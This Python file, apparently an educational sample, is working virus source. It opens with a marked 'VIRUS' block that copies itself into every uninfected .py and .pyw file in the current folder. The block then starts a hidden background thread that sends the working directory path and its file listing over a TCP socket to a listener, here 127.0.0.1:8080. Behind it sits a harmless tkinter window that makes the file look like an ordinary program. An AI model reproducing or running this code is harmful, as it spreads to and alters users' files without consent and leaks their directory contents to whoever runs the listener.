### START OF VIRUS ###

#######################
# @author: RaffaDNDM
# @date:   2022-02-27
#######################

import glob, sys, threading, os, socket

START = '### START OF VIRUS ###\n'
END = '### END OF VIRUS ###\n'

#Read the virus portion from the file itself
virus = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_part = False

for l in lines:
    if l == START:
        virus_part = True
    
    if virus_part:
        virus.append(l)

    if l == END:
        break

#Read the path of all the Python programs in the folder
py_programs = glob.glob('*.py') + glob.glob('*.pyw')

for p in py_programs:
    #Read the code of a python program
    with open(p, 'r') as f:
        program = f.readlines()

    infected = False

    for l in program:
        if l==START:
            infected = True
            break
    
    #If the program is not infected, add the virus part
    if not infected:
        infected_program = []
        #Virus part (from START to END)
        infected_program.extend(virus)
        #\n to separate virus from program
        infected_program.extend('\n')
        #Program part (already present in p program)
        infected_program.extend(program)

        with open(p, 'w') as f:
            f.writelines(infected_program)

#Malicious code
def malicious_code():
    #Create TCP socket
    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Connect to the remote server
    sd.connect(('127.0.0.1',8080))
    #Send the content of the folder
    msg = os.getcwd()+'\r\n'+','.join(os.listdir('.'))
    length = f'{len(msg.encode())}'.encode()
    sd.send(length+b'\r\n'+msg.encode())
    #Close the socket
    sd.close()

#Execute the virus on a parallel thread
#In this way the original main program can be
#executed without the user understands it
t = threading.Thread(target=malicious_code)
t.start()

### END OF VIRUS ###

#Main program
import tkinter
top = tkinter.Tk()
top.mainloop()